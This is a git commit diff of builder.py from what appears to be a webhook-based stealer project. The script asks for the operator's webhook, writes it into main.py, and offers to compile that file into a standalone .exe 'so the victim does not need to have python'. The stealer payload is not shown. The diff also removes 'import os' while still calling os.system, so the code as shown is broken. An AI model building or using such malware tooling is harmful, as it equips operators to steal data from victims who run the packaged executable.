a0ef63119e2c8939aaa567d5b851545952f5512d
yuvi <121696232+Yuvi5001@users.noreply.github.com>
2023-02-09 16:52:49 -0500

    fixed

--- builder.py
+++ builder.py
@@ -1,31 +1,25 @@
-import time
-import platform
-import os
+import codecs
 
 webhook = input("What is your webhook? ")
 
-search_text = "run builder.py first"
-
+search_text = "run builder py first"
 replace_text = webhook
 
-try:
-    with open(r"main.py", "r") as file:
+with codecs.open("main.py", "r", encoding="utf-8") as file:
+    data = file.read()
+    data = data.replace(search_text, replace_text)
 
-        data = file.read()
+with codecs.open("main.py", "w", encoding="utf-8") as file:
+    file.write(data)
 
-        data = data.replace(search_text, replace_text)
-
-    with open(r"main.py", "w") as file:
-
-        file.write(data)
-    print("building")
-    if platform.system() == "Windows":
-        pass
-    else:
-        quit()
-
+print('Added your webhook to "main.py"! type "exec" if you want to build it to a .exe file so the victim does not need to have python or you can just keep it and type "keep" and press enter to keep the "main.py" file with your webhook.')
+choice = input("Choice [exec/keep]: ")
+if choice == "exec":
     os.system("pip install pyinstaller")
     os.system("pyinstaller --onefile main.py")
-
-except:
-    pass
+elif choice == "keep":
+    print("Keeping the main.py file with your webhook attached to it.")
+    input("Enter to exit.")
+else:
+    print('u did not type keep or exec. now it is going to be defaulted to "keep"')
+    quit()
